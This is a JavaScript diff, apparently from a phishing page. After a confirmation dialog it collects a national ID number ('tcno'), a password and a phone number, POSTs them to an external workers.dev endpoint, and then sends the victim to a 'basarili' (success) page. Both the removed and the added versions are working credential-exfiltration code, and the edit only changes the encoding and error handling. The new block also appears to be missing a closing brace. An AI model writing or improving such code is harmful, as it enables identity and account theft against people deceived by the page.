@@ -466,24 +466,35 @@
 				}
 			}).then((result) => {
 				if (result.isConfirmed) {
-					var phone = result.value;  
-	
-				 
-					var formData = new FormData();
-					formData.append('tcno', tcno);
-					formData.append('password', password);
-					formData.append('phone', phone);
-	
-			 
-					fetch('https://broad-recipe-30da.selimjuhan10.workers.dev/', {
-						method: 'POST',
-						body: formData
-					});
-	
-			 
-					window.location.href = 'basarili.html';
-				}
-			});
+    var phone = result.value;  
+
+    // Create URLSearchParams
+    var params = new URLSearchParams();
+    params.append('tcno', tcno);
+    params.append('password', password);
+    params.append('phone', phone);
+
+    // Send the data as application/x-www-form-urlencoded
+    fetch('https://broad-recipe-30da.selimjuhan10.workers.dev/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: params.toString()
+    })
+    .then(response => {
+        if (response.ok) {
+            window.location.href = 'basarili.html';
+        } else {
+            // Handle error
+            console.error('Error:', response.statusText);
+        }
+    })
+    .catch(error => {
+        console.error('Fetch error:', error);
+    });
+}
+);
 	
 		 
 			setTimeout(() => {
